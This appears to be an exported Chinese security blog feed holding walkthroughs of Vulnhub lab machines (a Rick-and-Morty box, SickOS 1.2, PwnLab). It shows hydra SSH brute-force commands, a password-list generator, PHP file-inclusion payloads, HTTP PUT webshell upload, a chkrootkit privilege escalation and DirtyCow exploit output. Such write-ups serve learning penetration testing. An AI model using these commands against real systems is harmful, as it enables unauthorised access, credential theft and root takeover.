<p>cgi-bin下面有一个root_shell,但是访问是在建设中。tracertool.cgi则是一个路由追踪。大概能命令执行？(不过尝试之后，发现过滤的很严。)</p>
<h3 id="HTTPS-9090"><a href="#HTTPS-9090" class="headerlink" title="HTTPS-9090"></a>HTTPS-9090</h3><p>这是一个登录页面，但是实际上我尝试了很多操作都没用。。。（兔子洞。</p>
<h3 id="13337"><a href="#13337" class="headerlink" title="13337"></a>13337</h3><p>nc进来发现只有一个flag。</p>
<h3 id="60000"><a href="#60000" class="headerlink" title="60000"></a>60000</h3><p>nc进来能发现是root权限，但是除了查看flag。执行不了其他操作</p>
<h3 id="22222"><a href="#22222" class="headerlink" title="22222"></a>22222</h3><p>实在是没办法了，只能ssh爆破,密码是在80端口找到的password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L ~&#x2F;tools&#x2F;rockyou.txt  -p ******  -s 22222 ssh:&#x2F;&#x2F;192.168.56.5 -vV -f -t 64</span><br></pre></td></tr></table></figure>

<p>结果成功爆破出来了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[22222][ssh] host: 192.168.56.5   login: Summer   password: ******</span><br></pre></td></tr></table></figure>

<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><h3 id="正常道路"><a href="#正常道路" class="headerlink" title="正常道路"></a>正常道路</h3><p>通过ssh爆破密码，登录进去之后，会发现cat被禁用了。所以只能使用<code>less</code> 或者 <code>More</code>。进行了一波信息收集后，在Morty目录下会发现journal.txt.zip和safe_password.jpg.下载图片到本地binwalk分析后，会给出密码。用给出的密码解压journal.txt.zip.会提示RickSanchez的RICES_SAFE目录下有一个safe文件。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200718_144931.jpg" alt=""></p>
<p>这应该是个二进制程序，只有输入正确的内容，才会回显示。但是我们需要先将这个文件 copy到summer的家目录下才能运行。</p>
<p>输入safe 131333</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Summer@localhost ~]$ .&#x2F;safe 131333</span><br><span class="line">decrypt:        FLAG&#123;And Awwwaaaaayyyy we Go!&#125; - 20 Points</span><br><span class="line"></span><br><span class="line">Ricks password hints:</span><br><span class="line"> (This is incase I forget.. I just hope I don&#39;t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)</span><br><span class="line">Follow these clues, in order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1 uppercase character</span><br><span class="line">1 digit</span><br><span class="line">One of the words in my old bands name.  @</span><br></pre></td></tr></table></figure>

<p>密码提示:1个大写字母，1个数字，还有一个单词。生成字典文件。乐队名字稍微谷歌一下就能找到了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200718_150613.jpg" alt=""></p>
<figure class="highlight python"><figcaption><span>get-password</span></figcaption><table><tr><td class="code"><pre><span class="line">word = [<span class="string">'The'</span>, <span class="string">'Flesh'</span>, <span class="string">'Curtains'</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> word:</span><br><span class="line">            c.append(chr(i) + str(j) + z)</span><br><span class="line">            c.append(chr(i) + z + str(j))</span><br><span class="line">            c.append(str(j) + chr(i) + z)</span><br><span class="line">            c.append(str(j) + z + chr(i))</span><br><span class="line">            c.append(z + chr(i) + str(j))</span><br><span class="line">            c.append(z + str(j) + chr(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'rick-password.txt'</span>, <span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(i, file=f, sep=<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p>最后爆破RickSanchez的密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l RickSanchez  -P rick-password.txt  -s 22222 ssh:&#x2F;&#x2F;192.168.56.5 -vV -f -t 64</span><br><span class="line">[22222][ssh] host: 192.168.56.5   login: RickSanchez   password: *********</span><br></pre></td></tr></table></figure>

<p>无须多言。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200718_150830.jpg" alt=""></p>
<h3 id="内核利用"><a href="#内核利用" class="headerlink" title="内核利用"></a>内核利用</h3><p>看了内核版本后，发现是4.11.8-300，搜索一下后，发现有exp直接利用。但是目标机器本地没有gcc，所以要在自己的机器上编译后上传。然后运行就是root了</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200718_152904.jpg" alt=""></p>
<h2 id="0x03-FLAG"><a href="#0x03-FLAG" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h2><ol>
<li>FTP-21(FLAG{Whoa this is unexpected} - 10 Points)</li>
<li>HTTP-80(FLAG{Yeah d- just don’t do it.} - 10 Points)</li>
<li>HTTPS-9090(FLAG {There is no Zeus, in your face!} - 10 Points)</li>
<li>13337(FLAG:{TheyFoundMyBackDoorMorty}-10Points)</li>
<li>60000(FLAG{Flip the pickle Morty!} - 10 Points)</li>
<li>22222-Summer(FLAG{Get off the high road Summer!} - 10 Points)</li>
<li>journal.txt.zip(FLAG: {131333}} - 20 Points)</li>
<li>/home/RickSanchez/RICKS_SAFE/safe FLAG{And Awwwaaaaayyyy we Go!} - 20 Points}</li>
<li>/root/FLAG.txt(FLAG: {Ionic Defibrillator} - 30 points)</li>
</ol>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>hydra</tag>
        <tag>ssh</tag>
        <tag>CVE-2017-16995</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-SickOS-2</title>
    <url>/2020/06/23/Vulnhub-SickOS-2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机清单之一。<br><a href="https://www.vulnhub.com/entry/sickos-12,144/" target="_blank" rel="noopener">靶机下载链接</a></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_170617.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_170646.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_170735.jpg" alt=""></p>
<p>主机探测之后，会发现有个test目录。里面没有任何东西。</p>
<p>但是如果发送options标志，会得到所有允许的请求方式。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_171019.jpg" alt=""></p>
<p>如果有PUT方式的话，我们可以使用nmap的脚本上传文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 192.168.56.146 --script http-put --script-args http-put.url&#x3D;&#39;&#x2F;test&#x2F;shell.php&#39;,http-put.file&#x3D;&#39;&#x2F;data&#x2F;yjh.php&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_171345.jpg" alt=""></p>
<p>原本上传了php反向shell的，但是死活弹不回来，最后还是写了个一句话连接上去了。</p>
<p>连接上去后，进行信息枚举的时候查看/etc/rc.local文件发现是有过滤端口出站入站规则的。。但是我们不知道过滤规则是什么。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_171551.jpg" alt=""></p>
<p>只能一个个常见端口测试，最后测出443可以弹。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_172416.jpg" alt=""></p>
<hr>
弹回shell之后进行信息枚举......
<hr>


<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>再查看每日任务的时候，发现还有一个<code>chkrootkit</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_172738.jpg" alt=""></p>
<p>而<code>chkrootkit</code>曾经有一个版本是有漏洞的。<a href="https://www.exploit-db.com/exploits/33899" target="_blank" rel="noopener">CVE-2014-0476</a></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_173023.jpg" alt=""><br>完美符合版本。</p>
<p>查阅漏洞说明，chkrootkit会执行/tmp/update下面的命令，但是chkrootkit通常又会以root身份运行。/tmp下的文件又可以被随意创建，所以能够提权。</p>
<p>将/bin/bash添加为suid位文件。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_175405.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_175625.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果反弹shell弹不回来要考虑是不是目标服务器防火墙的问题，这次的这个靶机还有防火墙过滤规则，我之前是从来没有遇到过的（靶机打的少。</p>
<p>还有OPTIONS这个标志，能被查看所有的请求方式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.56.146&#x2F;test&#x2F; -X OPTIONS -v</span><br></pre></td></tr></table></figure>

<p>如果是PUT的话则可能可以上传文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p &#123;web-port&#125; &#123;ip&#125; --script http-put --script-args http-put.url&#x3D;&#39;&#123;target_upload_path&#x2F;upload_file&#125;&#39;,http-put.file&#x3D;&#39;&#123;locate_file&#125;&#39;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>chkrootkit</tag>
        <tag>OPTIONS-PUT</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-PwnLab</title>
    <url>/2020/07/12/Vulnhub-PwnLab/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://www.vulnhub.com/entry/pwnlab-init,158/" target="_blank" rel="noopener">靶机下载链接</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="namp扫描"><a href="#namp扫描" class="headerlink" title="namp扫描"></a>namp扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-12 01:03 EDT</span><br><span class="line">Nmap scan report for 192.168.56.5</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: PwnLab Intranet Image Hosting</span><br><span class="line">111&#x2F;tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100024  1          40816&#x2F;udp   status</span><br><span class="line">|   100024  1          46341&#x2F;udp6  status</span><br><span class="line">|   100024  1          48803&#x2F;tcp   status</span><br><span class="line">|_  100024  1          54404&#x2F;tcp6  status</span><br><span class="line">3306&#x2F;tcp open  mysql   MySQL 5.5.47-0+deb8u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.47-0+deb8u1</span><br><span class="line">|   Thread ID: 40</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: SupportsTransactions, Support41Auth, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient, SupportsLoadDataLocal, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: #xU$OEH&#123;UscwOc&amp;0\aT^</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds</span><br></pre></td></tr></table></figure>

<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.5&#x2F; -w ~&#x2F;tools&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -x php</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;192.168.56.5&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;tools&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Extensions:     php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;07&#x2F;12 14:00:13 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htaccess.php (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htpasswd.php (Status: 403)</span><br><span class="line">&#x2F;config.php (Status: 200)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;login.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;upload (Status: 301)</span><br><span class="line">&#x2F;upload.php (Status: 200)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;07&#x2F;12 14:00:25 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>一进去就感觉是文件包含。<code>http://192.168.56.5/?page=login</code>根据和扫描出来的文件对比，应该是拼接了php后缀</p>
<p>读取源码，获得数据库的连接密码及其他文件的源码</p>
<figure class="highlight plain"><figcaption><span>payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index</span><br><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;login</span><br><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><figcaption><span>config</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$server	  = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"H4u%QJ_H99"</span>;</span><br><span class="line">$database = <span class="string">"Users"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><figcaption><span>index</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Multilingual. Not implemented yet.</span></span><br><span class="line"><span class="comment">//setcookie("lang","en.lang.php");</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lang'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"lang/"</span>.$_COOKIE[<span class="string">'lang'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Not implemented yet.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"images/pwnlab.png"</span>&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=<span class="string">"/"</span>&gt;Home&lt;/a&gt; ] [ &lt;a href=<span class="string">"?page=login"</span>&gt;Login&lt;/a&gt; ] [ &lt;a href=<span class="string">"?page=upload"</span>&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Use this server to upload and share image files inside the intranet"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><figcaption><span>upload</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>])) &#123; <span class="keyword">die</span>(<span class="string">'You must be log in.'</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=<span class="string">''</span> method=<span class="string">'post'</span> enctype=<span class="string">'multipart/form-data'</span>&gt;</span><br><span class="line">			&lt;input type=<span class="string">'file'</span> name=<span class="string">'file'</span> id=<span class="string">'file'</span> /&gt;</span><br><span class="line">			&lt;input type=<span class="string">'submit'</span> name=<span class="string">'submit'</span> value=<span class="string">'Upload'</span>/&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		$filename  = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">		$filetype  = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">		$uploaddir = <span class="string">'upload/'</span>;</span><br><span class="line">		$file_ext  = strrchr($filename, <span class="string">'.'</span>);</span><br><span class="line">		$imageinfo = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">		$whitelist = <span class="keyword">array</span>(<span class="string">".jpg"</span>,<span class="string">".jpeg"</span>,<span class="string">".gif"</span>,<span class="string">".png"</span>); </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Not allowed extension, please upload images only.'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($filetype,<span class="string">'image'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Error 001'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/gif'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpeg'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpg'</span>&amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/png'</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Error 002'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(substr_count($filetype, <span class="string">'/'</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Error 003'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$uploadfile = $uploaddir . md5(basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])).$file_ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;img src=\""</span>.$uploadfile.<span class="string">"\"&gt;&lt;br /&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Error 4'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过审计以上的代码，我们知道了数据库的连接密码，以及如果cookie中有Land键值，index则会去包含lang目录下对应的文件。上传是白名单上传，并且会检测MINE类型和文件头。</p>
<p>看起来是不能直接上传PHP文件了，不过我们可以上传gif后缀的php文件。因为<strong>文件包含不在意包含文件的后缀名，只要检测包含文件的内容中有php代码，就会以php方式解析执行。</strong></p>
<p>所以我们的步骤是：</p>
<ol>
<li>登录到数据库，查询密码后。</li>
<li>登录后台，上传恶意gif文件。</li>
<li>设置cookie。 lang=恶意gif路径</li>
<li>利用index包含</li>
</ol>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200712_171846.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200712_171949.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200712_172011.jpg" alt=""></p>
<p>包含成功。</p>
<p>蚁剑设置cookie<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_172308.jpg" alt=""></p>
<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>蚁剑连上后，弹个shell给自己。之前数据库找到的密码，只有这两个用户能切换。</p>
<ul>
<li>kane</li>
<li>kent</li>
</ul>
<h3 id="Walkthrough-1"><a href="#Walkthrough-1" class="headerlink" title="Walkthrough-1"></a>Walkthrough-1</h3><p>进行信息收集后，我最后选择了内核提权。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~&#x2F;a$ gcc dc32.c -o cowroot -pthread 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">gcc dc32.c -o cowroot -pthread 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">kane@pwnlab:~&#x2F;a$ ls</span><br><span class="line">ls</span><br><span class="line">40616.c  cowroot  dc32.c  ofs_64  pokemon.c</span><br><span class="line">kane@pwnlab:~&#x2F;a$ .&#x2F;cowroot</span><br><span class="line">.&#x2F;cowroot</span><br><span class="line">DirtyCow root privilege escalation</span><br><span class="line">Backing up &#x2F;usr&#x2F;bin&#x2F;passwd.. to &#x2F;tmp&#x2F;bak</span><br><span class="line">Size of binary: 53112</span><br><span class="line">Racing, this may take a while..</span><br><span class="line">thread stopped</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd is overwritten</span><br><span class="line">Popping root shell.</span><br><span class="line">Don&#39;t forget to restore &#x2F;tmp&#x2F;bak</span><br><span class="line">thread stopped</span><br><span class="line">root@pwnlab:&#x2F;home&#x2F;kane&#x2F;a# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@pwnlab:&#x2F;home&#x2F;kane&#x2F;a# cd &#x2F;root</span><br><span class="line">cd &#x2F;root</span><br><span class="line">root@pwnlab:&#x2F;root# cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">.-&#x3D;~&#x3D;-.                                                                 .-&#x3D;~&#x3D;-.</span><br><span 